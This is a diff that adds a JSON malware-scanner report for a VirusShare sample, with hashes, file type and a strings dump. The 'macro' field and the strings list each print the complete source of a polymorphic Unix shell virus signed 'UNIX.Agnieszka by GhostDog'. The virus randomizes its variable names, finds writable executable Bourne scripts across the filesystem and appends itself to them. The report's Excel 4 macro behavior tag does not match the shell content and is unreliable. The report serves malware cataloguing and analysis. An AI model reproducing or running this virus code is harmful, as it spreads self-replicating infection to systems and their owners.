@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "exec": "May run an executable file or a system command using Excel 4 Macros"
+        },
+        "macro": "tail -n 29 $0 > /tmp/clear_version; tail -n 27 $0 > /tmp/infect_version\nchmod 755 /tmp/infect_version; (/tmp/infect_version &); exit 0\nmutate_var () {\nsed s/$1/$2/g /tmp/clear_version > /tmp/tmp_file; cp /tmp/tmp_file /tmp/clear_version }\nget_rnd_number () {\nrand_number=`expr $(($RANDOM % $(($2 - $1)))) + $1`\nRANDOM=$RANDOM\nreturn $rand_number }\nvar_string=\"var_string clear_version infect_version rand_number lettr_count new_var mutate_var tmp_file get_rnd_number each_entry letter\"\nfor each_entry in $var_string ; do\nget_rnd_number 3 15\nlettr_count=$?\nwhile [ $lettr_count -gt 0 ] ; do\nget_rnd_number 65 122\nletter=$?\nif ! [ $letter -gt 90 -a $letter -lt 97 ] ; then\nnew_var=$new_var`echo -e '\\'$(printf %o $letter)`\nlettr_count=`expr $lettr_count - 1`\nfi; done\nmutate_var $each_entry $new_var\nnew_var=\"\"; done\nfind / -type f -perm +111 -exec bash -c \\\n\"if [ ! -d {} ] && [ -z \\\"\\`grep -s Agnieszka {}\\`\\\" -a -x {} -a -w {} ] ; then\nif [ -n \\\"\\`file {} | grep Bourne\\`\\\" ] ; then\necho >> {} \ncat /tmp/clear_version >> {}\nfi; fi\" \\;\nrm /tmp/infect_version; rm /tmp/clear_version; rm /tmp/tmp_file\n: UNIX.Agnieszka by GhostDog"
+    },
+    "filename": "VirusShare_4a7ec22d1f9a29c394916a2309e90232",
+    "filesize": 1128,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "4a7ec22d1f9a29c394916a2309e90232",
+        "sha1": "69a9af9baa2cb2859152f4131d4535113ecee4d7",
+        "sha256": "c27ae09c59020b2f04015c4281572a51401d02e1f0de8a831847ba921dfe48c6"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "tail -n 29 $0 > /tmp/clear_version; tail -n 27 $0 > /tmp/infect_version",
+            "chmod 755 /tmp/infect_version; (/tmp/infect_version &); exit 0",
+            "mutate_var () {",
+            "sed s/$1/$2/g /tmp/clear_version > /tmp/tmp_file; cp /tmp/tmp_file /tmp/clear_version }",
+            "get_rnd_number () {",
+            "rand_number=`expr $(($RANDOM % $(($2 - $1)))) + $1`",
+            "RANDOM=$RANDOM",
+            "return $rand_number }",
+            "var_string=\"var_string clear_version infect_version rand_number lettr_count new_var mutate_var tmp_file get_rnd_number each_entry letter\"",
+            "for each_entry in $var_string ; do",
+            "get_rnd_number 3 15",
+            "lettr_count=$?",
+            "while [ $lettr_count -gt 0 ] ; do",
+            "get_rnd_number 65 122",
+            "letter=$?",
+            "if ! [ $letter -gt 90 -a $letter -lt 97 ] ; then",
+            "new_var=$new_var`echo -e '\\'$(printf %o $letter)`",
+            "lettr_count=`expr $lettr_count - 1`",
+            "fi; done",
+            "mutate_var $each_entry $new_var",
+            "new_var=\"\"; done",
+            "find / -type f -perm +111 -exec bash -c \\",
+            "\"if [ ! -d {} ] && [ -z \\\"\\`grep -s Agnieszka {}\\`\\\" -a -x {} -a -w {} ] ; then",
+            "if [ -n \\\"\\`file {} | grep Bourne\\`\\\" ] ; then",
+            "echo >> {} ",
+            "cat /tmp/clear_version >> {}",
+            "fi; fi\" \\;",
+            "rm /tmp/infect_version; rm /tmp/clear_version; rm /tmp/tmp_file",
+            ": UNIX.Agnieszka by GhostDog"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269893",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
